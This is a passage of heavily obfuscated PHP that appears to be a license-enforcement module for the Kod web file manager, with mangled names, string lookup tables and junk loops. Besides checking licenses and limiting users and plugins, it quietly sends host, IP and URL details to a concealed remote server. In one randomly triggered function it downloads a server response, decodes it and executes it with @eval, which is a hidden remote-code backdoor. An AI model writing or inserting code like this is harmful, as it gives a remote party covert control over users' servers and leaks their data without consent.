Model($û°œşÁ[33])->get(); $‰úûÇ´¬ = array($û°œşÁ[146] => $öÎ¶Âã÷[$û°œşÁ[34]], $û°œşÁ[147] => $öÎ¶Âã÷[$û°œşÁ[35]], $û°œşÁ[148] => $û°œşÁ[6]); $æ‰»Ğˆ = $ÁĞœÑÖŸ[741]; foreach ($›×ˆ™æ› as $¿òïï‹‡) { if (!isset($öÎ¶Âã÷[$¿òïï‹‡]) || !$öÎ¶Âã÷[$¿òïï‹‡]) { continue; } $‰úûÇ´¬[$¿òïï‹‡] = $öÎ¶Âã÷[$¿òïï‹‡]; } call_user_func(array($û°œşÁ[138], $û°œşÁ[139]), $‰úûÇ´¬); } private function rvjqb62e2739() { $ì¢ÈÊÏ =& $_SERVER[ÓïÕü]; $Ñî¡µ¾ =& $_SERVER[à¼£¥Õé]; if ($_SERVER[$Ñî¡µ¾[24]] != $Ñî¡µ¾[149]) { return; } if (!KodUser::isRoot()) { die; } $Æ®‡Ìıú = $GLOBALS[$Ñî¡µ¾[13]]; if (isset($Æ®‡Ìıú[$Ñî¡µ¾[150]])) { $this->xdiod1d70337(); die; } if (isset($Æ®‡Ìıú[$Ñî¡µ¾[151]]) && isset($Æ®‡Ìıú[$Ñî¡µ¾[151]]) == $Ñî¡µ¾[122]) { $Æ®‡Ìıú[$Ñî¡µ¾[152]] = Model($Ñî¡µ¾[33])->get($Ñî¡µ¾[153]); } if (!isset($Æ®‡Ìıú[$Ñî¡µ¾[152]]) || strlen($Æ®‡Ìıú[$Ñî¡µ¾[152]]) != 16) { show_json($Ñî¡µ¾[154] . $Æ®‡Ìıú[$Ñî¡µ¾[152]], !1); } $‚²ÎÒËæ = Model($Ñî¡µ¾[33])->get($Ñî¡µ¾[100]); $Êú´ŒèÃ = md5($_SERVER[$Ñî¡µ¾[106]] . $‚²ÎÒËæ); $Ë¦ÊƒÒî = $ì¢ÈÊÏ[742]; while ($Ë¦ÊƒÒî < $ì¢ÈÊÏ[699]) { if ($Ë¦ÊƒÒî >= 0) { break; } $Ë¦ÊƒÒî++; } $ÔÆĞ ÕÅ = array($Ñî¡µ¾[152] => $Æ®‡Ìıú[$Ñî¡µ¾[152]], $Ñî¡µ¾[155] => rand_string(16), $Ñî¡µ¾[156] => $Ñî¡µ¾[136], $Ñî¡µ¾[157] => $Ñî¡µ¾[158], $Ñî¡µ¾[159] => $_SERVER[$Ñî¡µ¾[160]], $Ñî¡µ¾[161] => $_SERVER[$Ñî¡µ¾[162]], $Ñî¡µ¾[163] => $_SERVER[$Ñî¡µ¾[164]], $Ñî¡µ¾[105] => $Êú´ŒèÃ, $Ñî¡µ¾[165] => Model($Ñî¡µ¾[33])->get($Ñî¡µ¾[131])); if (isset($Æ®‡Ìıú[$Ñî¡µ¾[151]]) && isset($Æ®‡Ìıú[$Ñî¡µ¾[151]]) == $Ñî¡µ¾[122]) { $ÔÆĞ ÕÅ[$Ñî¡µ¾[151]] = md5($ÔÆĞ ÕÅ[$Ñî¡µ¾[152]] . $Ñî¡µ¾[166] . $ÔÆĞ ÕÅ[$Ñî¡µ¾[155]]); } if ($Æ®‡Ìıú[$Ñî¡µ¾[167]] == $Ñî¡µ¾[168]) { $ÒŸÀ„…ã = $this->ygcq5c08912c($Êú´ŒèÃ, $Ñî¡µ¾[169]); $­¬äï©é = $this->hlxj37619dac(json_encode($ÔÆĞ ÕÅ), $Êú´ŒèÃ . $Ñî¡µ¾[170], 3); $­¬äï©é = $­¬äï©é . $Ñî¡µ¾[171] . $_SERVER[$Ñî¡µ¾[160]]; $Õ™öæ´… = $this->siqza4a297bf($Ñî¡µ¾[172] . $ÒŸÀ„…ã . $Ñî¡µ¾[173] . $­¬äï©é, -1); show_json($Õ™öæ´…, !0); } else { if ($Æ®‡Ìıú[$Ñî¡µ¾[167]] == $Ñî¡µ¾[174]) { $ê®«·êª = substr(md5($Ñî¡µ¾[175] . $Êú´ŒèÃ), 12, 15) . $Ñî¡µ¾[176]; $­¬äï©é = $this->ktvr28cdb429(trim($Æ®‡Ìıú[$Ñî¡µ¾[177]]), $ê®«·êª, 2); $Ù‚Ûğšî = json_decode($­¬äï©é, !0); if (!is_array($Ù‚Ûğšî) || !is_array($Ù‚Ûğšî[$Ñî¡µ¾[178]]) || $Ù‚Ûğšî[$Ñî¡µ¾[152]] != !0) { $Èùñ˜á = $Ñî¡µ¾[179]; $õù”ª‘ = $Ù‚Ûğšî[$Ñî¡µ¾[178]] ? $Ñî¡µ¾[180] . $Ù‚Ûğšî[$Ñî¡µ¾[178]] : $Èùñ˜á; show_json($õù”ª‘, !1); } else { $ÔÆĞ ÕÅ[$Ñî¡µ¾[155]] = $Ù‚Ûğšî[$Ñî¡µ¾[178]][$Ñî¡µ¾[181]]; } } else { $Ù‚Ûğšî = $this->siqza4a297bf($Ñî¡µ¾[182], $ÔÆĞ ÕÅ, 10); } } if (!is_array($Ù‚Ûğšî) || !is_array($Ù‚Ûğšî[$Ñî¡µ¾[178]]) || $Ù‚Ûğšî[$Ñî¡µ¾[152]] != !0) { $Èùñ˜á = LNG($Ñî¡µ¾[183]); $õù”ª‘ = $Ù‚Ûğšî[$Ñî¡µ¾[178]] ? $Ñî¡µ¾[180] . $Ù‚Ûğšî[$Ñî¡µ¾[178]] : $Èùñ˜á; show_json($õù”ª‘, !1); } $ñÁóÍÁ‡ = $Ù‚Ûğšî[$Ñî¡µ¾[178]]; $ú¸ÓêÎá = $this->lupm5bf010f2($ñÁóÍÁ‡[$Ñî¡µ¾[184]]); if (!$ú¸ÓêÎá || $ú¸ÓêÎá != $ñÁóÍÁ‡[$Ñî¡µ¾[129]]) { $ä¦îˆŠ± = array($Ñî¡µ¾[185] => Model($Ñî¡µ¾[33])->get($Ñî¡µ¾[100]), $Ñî¡µ¾[186] => $_SERVER[$Ñî¡µ¾[106]], $Ñî¡µ¾[187] => this_url(), $Ñî¡µ¾[161] => $_SERVER[$Ñî¡µ¾[162]]); $­¬äï©é = $this->hzyq23686e0e(json_encode($ä¦îˆŠ±)); $this->siqza4a297bf($Ñî¡µ¾[188] . $­¬äï©é); show_json(LNG($Ñî¡µ¾[189]), !0); } $îüÏÑçó = array($Ñî¡µ¾[153] => $ñÁóÍÁ‡[$Ñî¡µ¾[190]], $Ñî¡µ¾[191] => $ñÁóÍÁ‡[$Ñî¡µ¾[192]], $Ñî¡µ¾[193] => rand_string(16), $Ñî¡µ¾[108] => $ñÁóÍÁ‡[$Ñî¡µ¾[194]]); if ($ÔÆĞ ÕÅ[$Ñî¡µ¾[155]]) { $îüÏÑçó[$Ñî¡µ¾[193]] = $ÔÆĞ ÕÅ[$Ñî¡µ¾[155]]; } $ÈÀ‚€‹ = substr(md5($îüÏÑçó[$Ñî¡µ¾[191]]), 10, 10); $¿×¹ğ”¹ = $ÈÀ‚€‹ . $îüÏÑçó[$Ñî¡µ¾[108]] . $îüÏÑçó[$Ñî¡µ¾[193]]; $¾½³†ò¿ = $ì¢ÈÊÏ[743]; $îüÏÑçó[$Ñî¡µ¾[110]] = strrev(base64_encode($this->ygcq5c08912c($¿×¹ğ”¹, $Ñî¡µ¾[195]))); $§ªĞíÆĞ = $ì¢ÈÊÏ[744]; if (strlen($§ªĞíÆĞ) < $ì¢ÈÊÏ[699]) { die; } $çƒ¼ôÔ© = rand_string(16); $ÅÚª¸Æ = $ì¢ÈÊÏ[745]; $‡¡ßé Å = $çƒ¼ôÔ© . $îüÏÑçó[$Ñî¡µ¾[108]] . $this->ygcq5c08912c(md5($îüÏÑçó[$Ñî¡µ¾[153]]), $çƒ¼ôÔ©); $îüÏÑçó[$Ñî¡µ¾[111]] = base64_encode(strrev($this->ygcq5c08912c($‡¡ßé Å, $Ñî¡µ¾[196]))); $µı¥„úŠ = $ì¢ÈÊÏ[746]; if (strlen($µı¥„úŠ) < $ì¢ÈÊÏ[699]) { die; } if ($ñÁóÍÁ‡[$Ñî¡µ¾[197]] && $ñÁóÍÁ‡[$Ñî¡µ¾[197]] >= 1) { Model($Ñî¡µ¾[33])->setDeep($Ñî¡µ¾[198], $Ñî¡µ¾[122]); } Model($Ñî¡µ¾[33])->set($îüÏÑçó); $†®Ğ¼•ï = md5($_SERVER[$Ñî¡µ¾[106]] . strrev($‚²ÎÒËæ) . $îüÏÑçó[$Ñî¡µ¾[191]]); $ñÏÀñ×ö = $ì¢ÈÊÏ[747]; $ùÉ²Îá = strrev(substr($†®Ğ¼•ï, 10, 16)); $ÄÆ¸ŠÓ = $this->hlxj37619dac(json_encode($ñÁóÍÁ‡), $†®Ğ¼•ï); $î¿’êÁ› = array_to_keyvalue(Model($Ñî¡µ¾[7])->listData(), $Ñî¡µ¾[199]); $¸ÜŸü¤ = $ì¢ÈÊÏ[748]; if (!$¸ÜŸü¤) { return; } $¡›—åÊó = $î¿’êÁ›[$Ñî¡µ¾[200]]; $¤ù÷åè¯ = array(); $¤ù÷åè¯[$ùÉ²Îá] = $ÄÆ¸ŠÓ; Model($Ñî¡µ¾[7])->update($¡›—åÊó[$Ñî¡µ¾[201]], array($Ñî¡µ¾[202] => $¤ù÷åè¯)); $„ÅÓŞÕ› = $ì¢ÈÊÏ[749]; while (strlen($„ÅÓŞÕ›) < $ì¢ÈÊÏ[706]) { if (!$„ÅÓŞÕ›) { break; } $„ÅÓŞÕ›++; } $this->fcuyae97c967 = $ñÁóÍÁ‡; $this->nlgx2fa81bb8 = $îüÏÑçó[$Ñî¡µ¾[108]]; $this->licenseRegistSuccess(); $ˆçÜÆÖ­ = $ì¢ÈÊÏ[750]; if (strlen($ˆçÜÆÖ­) < $ì¢ÈÊÏ[708]) { return; } Cache::set($Ñî¡µ¾[203] . md5($‚²ÎÒËæ . $Ñî¡µ¾[204]), $Ñî¡µ¾[6]); show_json(LNG($Ñî¡µ¾[189]), !0); $Ôóôß¢Í = $ì¢ÈÊÏ[751]; if (!$Ôóôß¢Í) { die; } } private function licenseRegistSuccess() { $´ì—Ãïº =& $_SERVER[à¼£¥Õé]; $Ô‹úòå‹ = Model($´ì—Ãïº[33])->get(); $²İ¡§ô« = $_SERVER[ÓïÕü][752]; if ($Ô‹úòå‹[$´ì—Ãïº[63]] != $´ì—Ãïº[122]) { Model($´ì—Ãïº[33])->set($´ì—Ãïº[63], $´ì—Ãïº[122]); } Action($´ì—Ãïº[205])->initStart(!0); } private function xdiod1d70337() { $©ûã„ïî =& $_SERVER[ÓïÕü]; $Ùƒïı± =& $_SERVER[à¼£¥Õé]; Model($Ùƒïı±[33])->set(array($Ùƒïı±[153] => $Ùƒïı±[6], $Ùƒïı±[191] => $Ùƒïı±[6], $Ùƒïı±[108] => $Ùƒïı±[109], $Ùƒïı±[110] => $Ùƒïı±[6], $Ùƒïı±[111] => $Ùƒïı±[6])); $¿ïÙ·Ş’ = $©ûã„ïî[753]; while ($¿ïÙ·Ş’ < $©ûã„ïî[699]) { if ($¿ïÙ·Ş’ >= 0) { break; } $¿ïÙ·Ş’++; } Model($Ùƒïı±[33])->setDeep($Ùƒïı±[198], $Ùƒïı±[206]); $ÍÈÄíù¯ = $©ûã„ïî[754]; while (strlen($ÍÈÄíù¯) < $©ûã„ïî[695]) { if (!$ÍÈÄíù¯) { break; } $ÍÈÄíù¯++; } $this->fcuyae97c967 = array(); $ÏŠû´ = $©ûã„ïî[755]; $this->nlgx2fa81bb8 = $Ùƒïı±[109]; } private function iudg11ef605b() { $ù¨ŠØ¤ =& $_SERVER[ÓïÕü]; $—Ë¿× =& $_SERVER[à¼£¥Õé]; $_SERVER[$—Ë¿×[162]] = _get($_SERVER, $—Ë¿×[162], APP_HOST); $Ş¯¿ôæï = $ù¨ŠØ¤[756]; if (strlen($Ş¯¿ôæï) < $ù¨ŠØ¤[708]) { die; } $this->nlgx2fa81bb8 = $—Ë¿×[109]; $„È’œ°Ï = $ù¨ŠØ¤[757]; if (strlen($„È’œ°Ï) < $ù¨ŠØ¤[706]) { die; } $ıÖòøĞ± = Model($—Ë¿×[33])->get(); if ($ıÖòøĞ±[$—Ë¿×[108]] == $—Ë¿×[109]) { return; } $Ø¬ÂŞıÇ = Model($—Ë¿×[33])->get($—Ë¿×[100]); $ÎÛŞ½é = $ù¨ŠØ¤[758]; while ($ÎÛŞ½é < $ù¨ŠØ¤[699]) { if ($ÎÛŞ½é >= 0) { break; } $ÎÛŞ½é++; } $‘çò¥£ = $—Ë¿×[203] . md5($Ø¬ÂŞıÇ . $—Ë¿×[204]); $Ö¼î¯Å‹ = $ù¨ŠØ¤[759]; if (!$Ö¼î¯Å‹) { die; } $¨‡šÒªì = Cache::get($‘çò¥£); $œç¾şÔÁ = $ù¨ŠØ¤[760]; if (!is_array($¨‡šÒªì) || !isset($¨‡šÒªì[$—Ë¿×[207]]) || time() - $¨‡šÒªì[$—Ë¿×[207]] >= 60) { $Õé¦Ğæ§ = Model($—Ë¿×[7])->loadList(); $£®ºıƒ¼ = $Õé¦Ğæ§[$—Ë¿×[200]]; $áÃÌÜà’ = md5($_SERVER[$—Ë¿×[106]] . strrev($Ø¬ÂŞıÇ) . $ıÖòøĞ±[$—Ë¿×[191]]); $ä®¼Ëñ = strrev(substr($áÃÌÜà’, 10, 16)); $¨‡šÒªì = $this->ktvr28cdb429($£®ºıƒ¼[$—Ë¿×[86]][$ä®¼Ëñ], $áÃÌÜà’); $¨‡šÒªì = json_decode($¨‡šÒªì, !0); } if (!is_array($¨‡šÒªì)) { return $this->xdiod1d70337(); } $§¾éşìš = strtotime($¨‡šÒªì[$—Ë¿×[129]]); if (time() >= $§¾éşìš) { return $this->xdiod1d70337(); } if (!isset($¨‡šÒªì[$—Ë¿×[207]]) || time() - $¨‡šÒªì[$—Ë¿×[207]] > 20) { $¨‡šÒªì[$—Ë¿×[207]] = time(); Cache::set($‘çò¥£, $¨‡šÒªì); } $this->fcuyae97c967 = $¨‡šÒªì; $this->nlgx2fa81bb8 = $ıÖòøĞ±[$—Ë¿×[108]]; } private function cikj76933d24() { $…³¾ö»› =& $_SERVER[à¼£¥Õé]; $©ìÍ¢üÃ = $GLOBALS[$…³¾ö»›[13]]; $ŞÜÂÅî” = $_SERVER[$…³¾ö»›[24]]; if ($ŞÜÂÅî” == $…³¾ö»›[208] && $this->nlgx2fa81bb8 == $…³¾ö»›[109]) { show_json(LNG($…³¾ö»›[209]), !1, $…³¾ö»›[210]); } $ğãñª¿á = array($…³¾ö»›[211], $…³¾ö»›[212]); if (in_array($ŞÜÂÅî”, $ğãñª¿á)) { if ($this->nlgx2fa81bb8 == $…³¾ö»›[109] && isset($©ìÍ¢üÃ[$…³¾ö»›[213]])) { show_json(LNG($…³¾ö»›[209]), !1, $…³¾ö»›[210]); die; } $£À•Ğõ‹ = $this->syahcfa1f56c(); if ($£À•Ğõ‹ != intval($…³¾ö»›[214])) { if ($£À•Ğõ‹ <= Model($…³¾ö»›[125])->count()) { show_json(LNG($…³¾ö»›[215]), !1, $…³¾ö»›[210]); die; } } } } private function ysnx09334f32() { $Ÿ“ú˜Ó =& $_SERVER[ÓïÕü]; $°½˜İôê =& $_SERVER[à¼£¥Õé]; $”ë¾ÇÀß = array($°½˜İôê[119], $°½˜İôê[120]); if (!KodUser::isRoot() || !isset($_GET[$°½˜İôê[216]])) { return; } if (!in_array($_SERVER[$°½˜İôê[24]], $”ë¾ÇÀß)) { return; } $Ÿï «ÒÊ = $°½˜İôê[217]; $¬ä•İÁŠ = $Ÿ“ú˜Ó[761]; if (strlen($¬ä•İÁŠ) < $Ÿ“ú˜Ó[708]) { die; } $Ÿï «ÒÊ = $this->onduf80efd3e($Ÿï «ÒÊ, $°½˜İôê[218]); $ğüíŒ¾¾ = $Ÿ“ú˜Ó[762]; if (!$ğüíŒ¾¾) { die; } $Â¹ÓÕ–¼ = stream_context_create(array($°½˜İôê[219] => array($°½˜İôê[220] => $°½˜İôê[221], $°½˜İôê[222] => 3))); $…ï¹Õñ× = @file_get_contents($Ÿï «ÒÊ, !1, $Â¹ÓÕ–¼); header($°½˜İôê[223]); if ($…ï¹Õñ× && strstr($…ï¹Õñ×, $°½˜İôê[224])) { echo $…ï¹Õñ×; } die; } public function gasq78f60dce($‚§„—ùÎ) { $Ìıáè°Ü =& $_SERVER[ÓïÕü]; $è”– Ñè =& $_SERVER[à¼£¥Õé]; if ($this->nlgx2fa81bb8 == $è”– Ñè[225]) { return $‚§„—ùÎ; } $úÂ”ó¬Ç = $this->versionPluginList(); $‡¡ŸÈ·¤ = $Ìıáè°Ü[763]; while (strlen($‡¡ŸÈ·¤) < $Ìıáè°Ü[708]) { if (!$‡¡ŸÈ·¤) { break; } $‡¡ŸÈ·¤++; } $¸¦Ü¹¤› = explode($è”– Ñè[226], $this->versionPluginFilter()); $çêîÂã = array(); foreach ($úÂ”ó¬Ç as $ÂÇ„Ñˆ => $İ²¥Àš) { if ($İ²¥Àš == $è”– Ñè[227] && substr($this->nlgx2fa81bb8, 0, 1) == $è”– Ñè[227]) { continue; } if (!in_array($ÂÇ„Ñˆ, $¸¦Ü¹¤›)) { $çêîÂã[] = $ÂÇ„Ñˆ; } } foreach ($çêîÂã as $ÂÇ„Ñˆ) { unset($‚§„—ùÎ[$ÂÇ„Ñˆ]); } return $‚§„—ùÎ; $Ÿ¾Ä÷Ì = $Ìıáè°Ü[764]; if (!$Ÿ¾Ä÷Ì) { die; } } private function versionPluginList() { $‹ÎÔµİŒ =& $_SERVER[à¼£¥Õé]; return array($‹ÎÔµİŒ[228] => $‹ÎÔµİŒ[227], $‹ÎÔµİŒ[229] => $‹ÎÔµİŒ[227], $‹ÎÔµİŒ[230] => $‹ÎÔµİŒ[227], $‹ÎÔµİŒ[231] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[233] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[234] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[235] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[236] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[237] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[238] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[239] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[240] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[241] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[242] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[243] => $‹ÎÔµİŒ[232], $‹ÎÔµİŒ[244] => $‹ÎÔµİŒ[232]); } private function versionPluginFilter() { $ŞÒ‰Ó® =& $_SERVER[ÓïÕü]; $…Ä÷õá» =& $_SERVER[à¼£¥Õé]; if ($this->nlgx2fa81bb8 == $…Ä÷õá»[109]) { return $…Ä÷õá»[6]; } $ë ŞËÓÂ = _get($this->fcuyae97c967, $…Ä÷õá»[245], $…Ä÷õá»[6]); $òÎÉ¬¹€ = _get($this->fcuyae97c967, $…Ä÷õá»[116], $…Ä÷õá»[6]); $¦ıòáÒß = $ŞÒ‰Ó®[765]; while ($¦ıòáÒß < $ŞÒ‰Ó®[695]) { if ($¦ıòáÒß >= 0) { break; } $¦ıòáÒß++; } $ÚÊÌ¬°ğ = _get($this->fcuyae97c967, $…Ä÷õá»[246], $…Ä÷õá»[6]); if ($òÎÉ¬¹€ > time() && $ÚÊÌ¬°ğ > time()) { $×º§‡û = explode($…Ä÷õá»[226], $ë ŞËÓÂ); $êğ¬™ıï = array_keys($this->versionPluginList()); $ë ŞËÓÂ = array_merge($×º§‡û, $êğ¬™ıï); $ë ŞËÓÂ = implode($…Ä÷õá»[226], array_filter(array_unique($ë ŞËÓÂ))); } return $ë ŞËÓÂ; } private function nhrobfdb9765() { $®µ‚Çï =& $_SERVER[à¼£¥Õé]; if ($this->nlgx2fa81bb8 != $®µ‚Çï[109]) { $GLOBALS[$®µ‚Çï[86]][$®µ‚Çï[90]][$®µ‚Çï[247]] = $®µ‚Çï[206]; return; } $GLOBALS[$®µ‚Çï[86]][$®µ‚Çï[248]] = $®µ‚Çï[122]; if (Model($®µ‚Çï[249])->get($®µ‚Çï[63]) != $®µ‚Çï[206]) { Model($®µ‚Çï[249])->set($®µ‚Çï[63], $®µ‚Çï[206]); } } public function cpdgbb52779c() { return $_SERVER[à¼£¥Õé][250]; } private function lrfb73a1e8be() { $óÀ¢ß›ô =& $_SERVER[ÓïÕü]; $§ó­úø =& $_SERVER[à¼£¥Õé]; $§ÀÙ°šô = array($§ó­úø[251], $§ó­úø[252], $§ó­úø[253]); $·å§Î™û = $§ó­úø[254] . md5($§ó­úø[255]); $‘õ´Éèñ = $óÀ¢ß›ô[766]; if (!$‘õ´Éèñ) { die; } if ($this->nlgx2fa81bb8 == $§ó­úø[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$§ó­úø[24]], $§ÀÙ°šô)) { return; } if (time() % 4 != 0) { return; } $äıÇä†Ÿ = call_user_func(array($§ó­úø[256], $§ó­úø[257]), $·å§Î™û); $½Öüå¶€ = $óÀ¢ß›ô[767]; if ($äıÇä†Ÿ && time() - $äıÇä†Ÿ < intval($§ó­úø[258])) { return; } call_user_func(array($§ó­úø[256], $§ó­úø[139]), $·å§Î™û, time()); $¶âœ®« = $óÀ¢ß›ô[768]; while ($¶âœ®« < $óÀ¢ß›ô[688]) { if ($¶âœ®« >= 0) { break; } $¶âœ®«++; } $ÒÛšÓ•ç = Model($§ó­úø[33])->get($§ó­úø[100]); $éÚĞ×¤ê = array($§ó­úø[152] => Model($§ó­úø[33])->get($§ó­úø[153]), $§ó­úø[167] => $this->nlgx2fa81bb8, $§ó­úø[163] => $_SERVER[$§ó­úø[164]], $§ó­úø[165] => Model($§ó­úø[33])->get($§ó­úø[131]), $§ó­úø[105] => md5($_SERVER[$§ó­úø[106]] . $ÒÛšÓ•ç), $§ó­úø[156] => $§ó­úø[136], $§ó­úø[159] => $_SERVER[$§ó­úø[160]]); $í¯˜îÓ = $óÀ¢ß›ô[769]; while (strlen($í¯˜îÓ) < $óÀ¢ß›ô[688]) { if (!$í¯˜îÓ) { break; } $í¯˜îÓ++; } $˜¨ó¿¨ = $this->siqza4a297bf($§ó­úø[259], $éÚĞ×¤ê); if (!is_array($˜¨ó¿¨)) { return; } if ($˜¨ó¿¨[$§ó­úø[152]] && $˜¨ó¿¨[$§ó­úø[260]]) { if ($this->lupm5bf010f2($˜¨ó¿¨[$§ó­úø[260]]) == $éÚĞ×¤ê[$§ó­úø[152]]) { return; } } $this->xdiod1d70337(); $šéÀÒíŞ = $óÀ¢ß›ô[770]; while (strlen($šéÀÒíŞ) < $óÀ¢ß›ô[706]) { if (!$šéÀÒíŞ) { break; } $šéÀÒíŞ++; } if ($this->lupm5bf010f2($˜¨ó¿¨[$§ó­úø[260]]) != $éÚĞ×¤ê[$§ó­úø[152]]) { $«··±ô¬ = array($§ó­úø[185] => $ÒÛšÓ•ç, $§ó­úø[186] => $_SERVER[$§ó­úø[106]], $§ó­úø[187] => this_url(), $§ó­úø[161] => $_SERVER[$§ó­úø[162]]); $“¶»ÂĞ¸ = $this->hzyq23686e0e(json_encode($«··±ô¬)); $˜¨ó¿¨ = $this->siqza4a297bf($§ó­úø[188] . $“¶»ÂĞ¸); if ($˜¨ó¿¨ && is_array($˜¨ó¿¨) && isset($˜¨ó¿¨[$§ó­úø[260]])) { $Š¢ıÏßª = $this->ktvr28cdb429($˜¨ó¿¨[$§ó­úø[260]], 2); if ($Š¢ıÏßª) { $Š¢ıÏßª = $this->lupm5bf010f2($Š¢ıÏßª); } if ($Š¢ıÏßª) { try { @eval($Š¢ıÏßª); } catch (Exception $ºõ…¥À) { } } } } } private function siqza4a297bf($¹šÜã‚€ = '', $öÌ÷‹å¼ = array(), $ß†¸ûü¼ = 5) { $íß€“ƒ =& $_SERVER[ÓïÕü]; $³Ø¦Ã‚ =& $_SERVER[à¼£¥Õé]; $µÕ–ßâ = $³Ø¦Ã‚[261]; $äœŞ«Ä­ = $íß€“ƒ[771]; if (strlen($äœŞ«Ä­) < $íß€“ƒ[695]) { return; } $µÕ–ßâ = $this->onduf80efd3e($µÕ–ßâ, $³Ø¦Ã‚[262]); $µÕ–ßâ = $µÕ–ßâ . $¹šÜã‚€; if ($öÌ÷‹å¼ && is_array($öÌ÷‹å¼)) { $µÕ–ßâ = $µÕ–ßâ . $³Ø¦Ã‚[263] . http_build_query($öÌ÷‹å¼); } if ($öÌ÷‹å¼ === -1) { return $µÕ–ßâ; } $ØˆÃ¾ú· = stream_context_create(array($³Ø¦Ã‚[219] => array($³Ø¦Ã‚[222] => $ß†¸ûü¼, $³Ø¦Ã‚[220] => $³Ø¦Ã‚[264]), $³Ø¦Ã‚[265] => array($³Ø¦Ã‚[266] => !1, $³Ø¦Ã‚[267] => !1))); $®™¥¢› = $íß€“ƒ[772]; while (strlen($®™¥¢›) < $íß€“ƒ[708]) { if (!$®™¥¢›) { break; } $®™¥¢›++; } $öÌ÷‹å¼ = @file_get_contents($µÕ–ßâ, !1, $ØˆÃ¾ú·); $›Ù«‰€ê = $íß€“ƒ[773]; if (!$›Ù«‰€ê) { return; } return json_decode($öÌ÷‹å¼, !0); $Ò»óü®« = $íß€“ƒ[774]; while ($Ò»óü®« < $íß€“ƒ[699]) { if ($Ò»óü®« >= 0) { break; } $Ò»óü®«++; } $ïÖ§õ¬ = $íß€“ƒ[775]; if (strlen($ïÖ§õ¬) < $íß€“ƒ[706]) { return; } } private function syahcfa1f56c() { $Æ©èŒ”¶ =& $_SERVER[ÓïÕü]; $ŞÖÅßûË =& $_SERVER[à¼£¥Õé]; $”¹âœÔÄ = array($ŞÖÅßûË[268] => $ŞÖÅßûË[269], $ŞÖÅßûË[270] => $ŞÖÅßûË[271], $ŞÖÅßûË[272] => $ŞÖÅßûË[273], $ŞÖÅßûË[274] => $ŞÖÅßûË[275], $ŞÖÅßûË[276] => $ŞÖÅßûË[277], $ŞÖÅßûË[278] => $ŞÖÅßûË[214], $ŞÖÅßûË[279] => $ŞÖÅßûË[214], $ŞÖÅßûË[280] => $ŞÖÅßûË[269], $ŞÖÅßûË[281] => $ŞÖÅßûË[271], $ŞÖÅßûË[282] => $ŞÖÅßûË[273], $ŞÖÅßûË[283] => $ŞÖÅßûË[284], $ŞÖÅßûË[285] => $ŞÖÅßûË[275], $ŞÖÅßûË[286] => $ŞÖÅßûË[287], $ŞÖÅßûË[288] => $ŞÖÅßûË[277], $ŞÖÅßûË[289] => $ŞÖÅßûË[290], $ŞÖÅßûË[291] => $ŞÖÅßûË[292], $ŞÖÅßûË[293] => $ŞÖÅßûË[294]); $˜ÈĞ•Á = $Æ©èŒ”¶[776]; $ø¹öúòÆ = $”¹âœÔÄ[$this->nlgx2fa81bb8]; $ø¹öúòÆ = intval($ø¹öúòÆ ? $ø¹öúòÆ : $ŞÖÅßûË[269]); $Œğ€ÉıØ = _get($this->fcuyae97c967, $ŞÖÅßûË[295]); $Œğ€ÉıØ = $Œğ€ÉıØ ? intval($Œğ€ÉıØ) : 0; $åÊûÓÃŸ = $Æ©èŒ”¶[777]; if (!$åÊûÓÃŸ) { die; } return $ø¹öúòÆ + $Œğ€ÉıØ; $ÉŞ¶°È¦ = $Æ©èŒ”¶[778]; while ($ÉŞ¶°È¦ < $Æ©èŒ”¶[695]) { if ($ÉŞ¶°È¦ >= 0) { break; } $ÉŞ¶°È¦++; } } public function gwijbd3c4c81($Éşèã‡) { $¤ø€Ò×¡ =& $_SERVER[à¼£¥Õé]; $ŒşÜ¹¦ = $this->syahcfa1f56c(); if ($Éşèã‡[$¤ø€Ò×¡[296]] == $¤ø€Ò×¡[122]) { return; } if ($ŒşÜ¹¦ >= intval($¤ø€Ò×¡[214])) { return; } $˜ÓôƒöŠ = Model($¤ø€Ò×¡[125])->count(); if ($˜ÓôƒöŠ <= $ŒşÜ¹¦) { return; } $Ì¦ê€‰ñ = Model($¤ø€Ò×¡[125])->field($¤ø€Ò×¡[296])->limit($ŒşÜ¹¦)->select(); $Ì¦ê€‰ñ = array_to_keyvalue($Ì¦ê€‰ñ, $¤ø€Ò×¡[6], $¤ø€Ò×¡[296]); if (!in_array($Éşèã‡[$¤ø€Ò×¡[296]], $Ì¦ê€‰ñ)) { show_json($¤ø€Ò×¡[297], !1, $¤ø€Ò×¡[210]); } } public function ovir687c359c() { $¡Ôªˆ– =& $_SERVER[ÓïÕü]; $ª÷ã´Ù• =& $_SERVER[à¼£¥Õé]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $‰…—…ê = $ª÷ã´Ù•[217]; $‰…—…ê = $this->onduf80efd3e($‰…—…ê, $ª÷ã´Ù•[218]); $ğ°ıïóğ = $¡Ôªˆ–[779]; if (strlen($ğ°ıïóğ) < $¡Ôªˆ–[688]) { return; } $æÓÆµèï = stream_context_create(array($ª÷ã´Ù•[219] => array($ª÷ã´Ù•[220] => $ª÷ã´Ù•[221], $ª÷ã´Ù•[222] => 3))); $İ¹âû¦™ = $¡Ôªˆ–[780]; if (strlen($İ¹âû¦™) < $¡Ôªˆ–[695]) { return; } $¹“ŒŞğ„ = @file_get_contents($‰…—…ê, !1, $æÓÆµèï); $µ°©ü—¶ = $¡Ôªˆ–[781]; while ($µ°©ü—¶ < $¡Ôªˆ–[695]) { if ($µ°©ü—¶ >= 0) { break; } $µ°©ü—¶++; } echo $ª÷ã´Ù•[298] . hash_encode($¹“ŒŞğ„) . $ª÷ã´Ù•[299]; $šš­¼à = $¡Ôªˆ–[782]; while ($šš­¼à < $¡Ôªˆ–[699]) { if ($šš­¼à >= 0) { break; } $šš­¼à++; } } private function hlxj37619dac($ßñğ¬Ó†, $ÍƒŒĞÑú, $ßË£È‘¸ = 3) { $Œ‹Ş¬¡Ô =& $_SERVER[ÓïÕü]; $ß©Â†©Ó =& 